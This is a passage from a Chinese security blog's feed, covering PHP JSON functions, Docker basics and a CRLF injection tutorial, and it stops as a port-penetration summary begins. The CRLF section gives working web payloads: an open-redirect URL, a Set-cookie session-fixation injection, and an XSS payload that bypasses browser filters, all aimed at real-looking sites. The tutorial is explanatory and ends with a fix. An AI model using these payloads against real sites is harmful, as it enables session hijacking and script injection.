<p>以下实例演示了如何将 PHP 对象转换为 JSON 格式数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   class Emp &#123;</span><br><span class="line">       public $name = &quot;&quot;;</span><br><span class="line">       public $hobbies  = &quot;&quot;;</span><br><span class="line">       public $birthdate = &quot;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   $e = new Emp();</span><br><span class="line">   $e-&gt;name = &quot;sachin&quot;;</span><br><span class="line">   $e-&gt;hobbies  = &quot;sports&quot;;</span><br><span class="line">   $e-&gt;birthdate = date(&apos;m/d/Y h:i:s a&apos;, &quot;8/5/1974 12:20:03 p&quot;);</span><br><span class="line">   $e-&gt;birthdate = date(&apos;m/d/Y h:i:s a&apos;, strtotime(&quot;8/5/1974 12:20:03&quot;));</span><br><span class="line"></span><br><span class="line">   echo json_encode($e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>以上代码执行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;sachin&quot;,&quot;hobbies&quot;:&quot;sports&quot;,&quot;birthdate&quot;:&quot;08\/05\/1974 12:20:03 pm&quot;&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="json_decode">json_decode</span></h4><p>PHP json_decode() 函数用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量。</p>
<h5><span id="语法">语法</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed json_decode ($json [,$assoc = false [, $depth = 512 [, $options = 0 ]]])</span><br></pre></td></tr></table></figure>
<h5><span id="参数">参数</span></h5><ul>
<li>json_string: 待解码的 JSON 字符串，必须是 UTF-8 编码数据</li>
<li>assoc: 当该参数为 TRUE 时，将返回数组，FALSE 时返回对象。</li>
<li>depth: 整数类型的参数，它指定递归深度</li>
<li>options: 二进制掩码，目前只支持 JSON_BIGINT_AS_STRING 。</li>
</ul>
<h5><span id="实例">实例</span></h5><p>以下实例演示了如何解码 JSON 数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $json = &apos;&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;&apos;;</span><br><span class="line"></span><br><span class="line">   var_dump(json_decode($json));</span><br><span class="line">   var_dump(json_decode($json, true));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>以上代码执行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">object(stdClass)#1 (5) &#123;</span><br><span class="line">    [&quot;a&quot;] =&gt; int(1)</span><br><span class="line">    [&quot;b&quot;] =&gt; int(2)</span><br><span class="line">    [&quot;c&quot;] =&gt; int(3)</span><br><span class="line">    [&quot;d&quot;] =&gt; int(4)</span><br><span class="line">    [&quot;e&quot;] =&gt; int(5)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(5) &#123;</span><br><span class="line">    [&quot;a&quot;] =&gt; int(1)</span><br><span class="line">    [&quot;b&quot;] =&gt; int(2)</span><br><span class="line">    [&quot;c&quot;] =&gt; int(3)</span><br><span class="line">    [&quot;d&quot;] =&gt; int(4)</span><br><span class="line">    [&quot;e&quot;] =&gt; int(5)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="phpampjson中文显示问题">PHP&amp;JSON中文显示问题</span></h3><h4><span id="php输出json格式">PHP输出JSON格式</span></h4><p>把数组直接输出为JSON</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = array(&apos;姓名&apos;=&gt;&apos;小李&apos;,&apos;年龄&apos;=&gt;&apos;18&apos;);</span><br><span class="line">$json = json_encode($arr);</span><br><span class="line">echo $json;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出的结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;\u59d3\u540d&quot;:&quot;\u5c0f\u674e&quot;,&quot;\u5e74\u9f84&quot;:&quot;18&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>中文字符被编码成了Unicode</p>
<p>做如下处理，把输出结果匹配一下，把Unicode还原成了汉字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = array(&apos;姓名&apos;=&gt;&apos;小李&apos;,&apos;年龄&apos;=&gt;&apos;18&apos;);</span><br><span class="line">$json = json_encode($arr);</span><br><span class="line">echo $json;</span><br><span class="line">echo &apos;&lt;/br&gt;&apos;;</span><br><span class="line">echo decodeUnicode($json);</span><br><span class="line"> </span><br><span class="line">function decodeUnicode($str)&#123;</span><br><span class="line">  return preg_replace_callback(&apos;/\\\\u([0-9a-f]&#123;4&#125;)/i&apos;,</span><br><span class="line">    create_function(</span><br><span class="line">      &apos;$matches&apos;,</span><br><span class="line">      &apos;return mb_convert_encoding(pack(&quot;H*&quot;, $matches[1]), &quot;UTF-8&quot;, &quot;UCS-2BE&quot;);&apos;</span><br><span class="line">    ),</span><br><span class="line">    $str);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出的结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;\u59d3\u540d&quot;:&quot;\u5c0f\u674e&quot;,&quot;\u5e74\u9f84&quot;:&quot;18&quot;&#125;</span><br><span class="line">&#123;&quot;姓名&quot;:&quot;小李&quot;,&quot;年龄&quot;:&quot;18&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>同时PHP5.4版本，已经给Json新增了一个选项: JSON_UNESCAPED_UNICODE。加上这个选项后，就不会自动把中文编码了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = array(&apos;姓名&apos;=&gt;&apos;小李&apos;,&apos;年龄&apos;=&gt;&apos;18&apos;);</span><br><span class="line">$json = json_encode($arr, JSON_UNESCAPED_UNICODE);</span><br><span class="line">echo $json;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出的结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;姓名&quot;:&quot;小李&quot;,&quot;年龄&quot;:&quot;18&quot;&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="reference">Reference</span></h2><p><a href="http://www.runoob.com/php/php-json.html" target="_blank" rel="noopener">PHP JSON | 菜鸟教程</a><br><a href="http://www.ruanyifeng.com/blog/2009/05/data_types_and_json.html" target="_blank" rel="noopener">数据类型和Json格式</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Docker基础与实战]]></title>
      <url>https://uknowsec.cn/posts/notes/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E6%88%98.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="安装docker">安装Docker</span></h1><h2><span id="linux">Linux</span></h2><p>Linux中两种Docker安装方法，一种是使用Docker提供的自动安装脚本，另一种是使用Linux发行版的packaging system直接安装</p>
<h3><span id="自动安装脚本">自动安装脚本</span></h3><p>Docker自动识别Linux发行版的类型，提供用于安装Docker包的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget -q0- https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>
<p>使用get.docker.com脚本安装Docker时，hello-world镜像也会自动安装。由于不使用hello-world镜像，故将其全部删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker rm `sudo docker ps -aq`</span><br><span class="line">sudo docker rmi hello-world</span><br></pre></td></tr></table></figure>
<h2><span id="ubuntu">Ubuntu</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker.io</span><br><span class="line">sudo ln -sf /usr/bin/docker.io /usr/local/bin/docker</span><br></pre></td></tr></table></figure>
<p>将/usr/bin/docker.io可执行文件链接到/usr/local/bin/docker并使用</p>
<h2><span id="windows">Windows</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/boot2docker/windows-installer/releases</span><br></pre></td></tr></table></figure>
<h1><span id="使用docker">使用Docker</span></h1><p>Docker命令格式为docker&lt;命令&gt;,比如docker run、docker push，且必须总是以root权限运行</p>
<h2><span id="使用search命令搜索镜像">使用search命令搜索镜像</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker search ubuntu</span><br></pre></td></tr></table></figure>
<h2><span id="使用pull命令下载镜像">使用pull命令下载镜像</span></h2><p>从Docker hub下载Ubuntu Linux镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull ubuntu:latest</span><br></pre></td></tr></table></figure>
<h2><span id="使用images命令列出镜像目录">使用images命令列出镜像目录</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure>
<p>docker images命令用于列出本地主机中所有镜像。在该命令中设置镜像名称—比如docker images ubuntu—则只列出名称相同但标签不同的镜像</p>
<h2><span id="使用run命令创建容器">使用run命令创建容器</span></h2><p>使用镜像创建容器后，运行Bash shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -i -t --name hello ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>命令格式为docker run&lt;选项&gt;&lt;镜像名称&gt;&lt;要运行的文件&gt;。将ubuntu镜像创建为容器后，运行ubuntu镜像中的/bin/bash。也可以不用镜像名称而用镜像ID</p>
<ul>
<li>使用 -i(interactive)、-t(Pseudo-tty)选项可以在运行的Bash shell中进行输入与输出</li>
<li>使用 –name选项可以指定容器名称。若不指定名称，Docker会自动生成名称并进行指定</li>
</ul>
<h2><span id="使用ps命令查看容器列表">使用ps命令查看容器列表</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>
<h2><span id="使用start命令启动容器">使用start命令启动容器</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start hello</span><br></pre></td></tr></table></figure>
<p>命令格式为docker start&lt;容器名称&gt;,也可以使用容器ID替代容器名称</p>
<h2><span id="使用restart命令重启容器">使用restart命令重启容器</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker restart hello</span><br></pre></td></tr></table></figure>
<p>命令格式为docker restart&lt;容器名称&gt;,也可以使用容器ID替代容器名称</p>
<h2><span id="使用attach命令连接容器">使用attach命令连接容器</span></h2><p>执行如下命令后，再输入一次回车键，显示Bash shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker attach hello</span><br></pre></td></tr></table></figure>
<p>命令格式为docker attach&lt;容器名称&gt;,也可以使用容器ID替代容器名称<br>在Bash shell中输入exit或Ctrl+D终止容器，若依次输入Ctrl+P、Ctrl+Q则不会终止容器而只退出</p>
<h2><span id="使用exec命令从外部运行容器内的命令">使用exec命令从外部运行容器内的命令</span></h2><p>当前容器正以/bin/bash形式处于运行状态，也可以不通过/bin/bash而从外部运行容器内的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec hello echo &quot;Hello World&quot;</span><br></pre></td></tr></table></figure></p>
<p>命令格式为docker exec&lt;容器名称&gt;&lt;命令&gt;&lt;形式参数&gt;,也可以使用容器ID替代容器名称。</p>
<h2><span id="使用stop命令终止容器">使用stop命令终止容器</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker stop hello</span><br></pre></td></tr></table></figure>
<h2><span id="使用rm命令删除容器">使用rm命令删除容器</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker rm hello</span><br></pre></td></tr></table></figure>
<p>命令格式为docker rm&lt;容器名称&gt;,也可以使用容器ID替代容器名称。</p>
<h2><span id="使用rmi命令删除镜像">使用rmi命令删除镜像</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker rmi ubuntu:latest</span><br></pre></td></tr></table></figure>
<p>命令格式为docker rm&lt;镜像名称&gt;:&lt;标签&gt;,也可以使用容器ID替代容器名称。</p>
<h1><span id="创建docker镜像">创建Docker镜像</span></h1><h2><span id="编写dockerfile">编写Dockerfile</span></h2><blockquote>
<p>example/Dockerfile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:14.04</span><br><span class="line">MAINTAINER Foo Bar &lt;foo@bar.com&gt;</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get install -y nginx</span><br><span class="line">RUN echo &quot;\ndaemon off;&quot; &gt;&gt; /etc/nginx/nginx.conf</span><br><span class="line">RUN chown -R www-date:www-date /var/lib/nginx</span><br><span class="line"></span><br><span class="line">VOLUME [&quot;/date&quot;, &quot;/etc/nginx/site-enabled&quot;, &quot;/var/log/nginx&quot;]</span><br><span class="line"></span><br><span class="line">WORKDIR /etc/nginx</span><br><span class="line"></span><br><span class="line">CMD [&quot;nginx&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line">EXPOSE 443</span><br></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>FROM:指定基于的基础镜像。Docker镜像基于已创建的镜像。指令格式为&lt;镜像名称&gt;&lt;标签&gt;</li>
<li>MAINTAINER:维护者信息</li>
<li>RUN:运行shell脚本或命令</li>
<li>CMD:指定容器启动时执行的文件或shell脚本</li>
<li>WORKDIR:为CMD中设置的可执行文件设置运行目录</li>
<li>EXPOSE:与主机相连的端口号</li>
</ul>
<h2><span id="使用build命令创建镜像">使用build命令创建镜像</span></h2><p>Dockerfile文件编写完成后，在保存Dockerfile文件的example目录执行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker build --tag hello:0.1</span><br></pre></td></tr></table></figure></p>
<p>命令格式为docker build &lt;选项&gt;<dockerfile 路径="">。使用–tag选项可以设置镜像名称与标签。</dockerfile></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --name hello-nginx -d -p 80:80 -v /root/data:/data hello:0.1</span><br></pre></td></tr></table></figure>
<ul>
<li>-d 选项在后台运行容器</li>
<li>-p 80:80选项将主机的80端口与容器的80端口连接起来，并暴露到外部。这样设置后，连接http://&lt;主机IP&gt;:80就会连接到容器的80号端口</li>
<li>-v /root/data:/data选项将主机的/root/data目录连接到容器的/data目录。若将文件放入/root/data目录，则能从容器读取相应文件。</li>
</ul>
<h1><span id="查看docker">查看Docker</span></h1><h2><span id="使用history命令查看镜像历史">使用history命令查看镜像历史</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker history hello:0.1</span><br></pre></td></tr></table></figure>
<p>命令格式为docker history&lt;镜像名称&gt;:&lt;标签&gt;</p>
<h2><span id="使用cp命令复制文件">使用cp命令复制文件</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp hello-nginx:/etc/nginx/nginx.conf ./</span><br></pre></td></tr></table></figure>
<p>命令格式为docker cp&lt;容器名称&gt;:&lt;路径&gt;&lt;主机路径&gt;</p>
<h2><span id="使用commit命令从容器的修改中创建镜像">使用commit命令从容器的修改中创建镜像</span></h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</span><br></pre></td></tr></table></figure>
<p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
<p>-a “Foo Bar<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#102;&#111;&#x6f;&#64;&#98;&#x61;&#114;&#46;&#x63;&#111;&#109;">&#102;&#111;&#x6f;&#64;&#98;&#x61;&#114;&#46;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
<h2><span id="使用diff命令检查容器文件的修改">使用diff命令检查容器文件的修改</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker diff hello-nginx</span><br></pre></td></tr></table></figure>
<p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
<h2><span id="使用inspect命令查看详细信息">使用inspect命令查看详细信息</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker inspect hello-nginx</span><br></pre></td></tr></table></figure>
<p>命令格式为docker inspect&lt;容器名称&gt;</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[CRLF Injection漏洞利用与学习]]></title>
      <url>https://uknowsec.cn/posts/notes/CRLF-Injection%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="crlf简介">CRLF简介</span></h2><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
<h2><span id="基础知识">基础知识</span></h2><h3><span id="php-header-函数">PHP header() 函数</span></h3><h4><span id="定义和用法">定义和用法</span></h4><p>header() 函数向客户端发送原始的 HTTP 报头。</p>
<p>认识到一点很重要，即必须在任何实际的输出被发送之前调用 header() 函数（在 PHP 4 以及更高的版本中，您可以使用输出缓存来解决此问题）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 结果出错</span><br><span class="line">// 在调用 header() 之前已存在输出</span><br><span class="line">header(&apos;Location: http://www.example.com/&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="语法">语法</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(string,replace,http_response_code)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要发送的报头字符串。</td>
</tr>
<tr>
<td>replace</td>
<td style="text-align:center">可选。指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。</td>
</tr>
<tr>
<td>http_response_code</td>
<td style="text-align:center">可选。把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</td>
</tr>
</tbody>
</table>
<h4><span id="提示和注释">提示和注释</span></h4><p>注释：从 PHP 4.4 之后，该函数防止一次发送多个报头。这是对头部注入攻击的保护措施。</p>
<h3><span id="url重定向跳转">URL重定向/跳转</span></h3><p>对于URL跳转的实现一般会有几种实现方式：</p>
<ul>
<li>META标签内跳转</li>
<li>javascript跳转</li>
<li>header头跳转</li>
</ul>
<p>通过以GET或者POST的方式接收将要跳转的URL，然后通过上面的几种方式的其中一种来跳转到目标URL。一方面，由于用户的输入会进入Meta，javascript，http头所以都可能发生相应上下文的漏洞，如xss等等，但是同时，即使只是对于URL跳转本身功能方面就存在一个缺陷，因为会将用户浏览器从可信的站点导向到不可信的站点，同时如果跳转的时候带有敏感数据一样可能将敏感数据泄漏给不可信的第三方。</p>
<p>譬如一个典型的登录跳转如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$url=$_GET[&apos;jumpto&apos;];</span><br><span class="line"></span><br><span class="line">header(&quot;Location: $url&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>如果jumpto没有任何限制，所以恶意用户可以提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/login.php?jumpto=http://www.evil.com</span><br></pre></td></tr></table></figure></p>
<h2><span id="漏洞利用">漏洞利用</span></h2><ul>
<li>利用CRLF Injection设置一个SESSION,造成一个“会话固定漏洞”</li>
<li>利用CRLF Injection造成一个无视浏览器Filter的反射型XSS</li>
</ul>
<h3><span id="会话固定漏洞">会话固定漏洞</span></h3><p>一般网站会在HTTP头中用Location: <a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a> 这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</p>
<p>所以一个正常的302跳转包是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily </span><br><span class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close </span><br><span class="line">Location: http://www.sina.com.cn</span><br></pre></td></tr></table></figure></p>
<p>但如果我们输入的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun</span><br></pre></td></tr></table></figure></p>
<p>注入了一个换行，此时的返回包就会变成这样： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily </span><br><span class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close </span><br><span class="line">Location: http://www.sina.com.cn </span><br><span class="line">Set-cookie: JSPSESSID=wooyun</span><br></pre></td></tr></table></figure>
<p>这个时候这样我们就给访问者设置了一个SESSION，造成一个“会话固定漏洞”。</p>
<h3><span id="过filter的反射型xss">过Filter的反射型XSS</span></h3><p>HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。</p>
<p>比如一个网站接受url参数 <a href="http://test.sina.com.cn/?url=xxx" target="_blank" rel="noopener">http://test.sina.com.cn/?url=xxx</a> ，xxx放在Location后面作为一个跳转。如果我们输入的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.sina.com.cn/?url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure></p>
<p>我们的返回包就会变成这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily </span><br><span class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close </span><br><span class="line">Location:</span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
<p>之前说了浏览器会根据第一个CRLF把HTTP包分成头和体，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS。</p>
<p>为什么说是无视浏览器filter的，这里涉及到另一个问题。</p>
<p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。</p>
<p>怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p>
<p>说到这里应该就很清楚了，HRS不正是注入HTTP头的一个漏洞吗，我们可以将X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。</p>
<h2><span id="修复">修复</span></h2><p>过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头。</p>
<h2><span id="reference">Reference</span></h2><p><a href="http://wooyun.jozxing.cc/static/drops/papers-2466.html" target="_blank" rel="noopener">CRLF Injection漏洞的利用与实例分析</a><br><a href="http://wooyun.jozxing.cc/static/drops/papers-58.html" target="_blank" rel="noopener">URL重定向/跳转漏洞</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[端口渗透总结]]></title>
      <url>https://uknowsec.cn/posts/notes/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="服务默认端口">服务默认端口</span></h2><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p>
<p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p>
<p>动态/私有：49152-65535，不为服务分配这些端口；</p>
<h2><span id="文件共享服务端口渗透">文件共享服务端口渗透</span></h2><h3><span id="ftp服务">FTP服务</span></h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
